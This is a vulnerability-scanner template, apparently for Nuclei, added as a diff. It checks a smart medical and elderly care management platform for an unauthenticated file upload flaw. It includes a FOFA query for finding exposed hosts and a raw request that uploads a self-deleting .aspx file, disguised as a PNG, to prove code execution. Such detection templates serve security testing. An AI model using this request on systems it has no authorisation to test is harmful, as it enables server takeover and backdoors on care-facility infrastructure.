@@ -1,0 +1,54 @@
+id: zhihuiyiyang-InfoUpload-File-upload
+
+info:
+  tags: zhihuiyiyang-InfoUpload-File-upload
+  name: 智慧医养综合服务管理平台 InfoUpload 任意文件上传漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="Content/css/Login/images/gtx-main-bg00004.png" || body="KingonUI.CommItemInfo()"
+    智慧医养综合服务管理平台 InfoUpload 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /WebData/InfoUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+        Content-Type: image/png
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9-]+[_a-zA-Z0-9]+\.aspx)'
+         internal: true
+       - type: regex 
+         part: body
+         name: time
+         group: 1
+         regex:
+           - '(UpLoadUserExcel/+[0-9]+)'
+         internal: true
+  - raw:
+      - |
+        GET /{{time}}/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
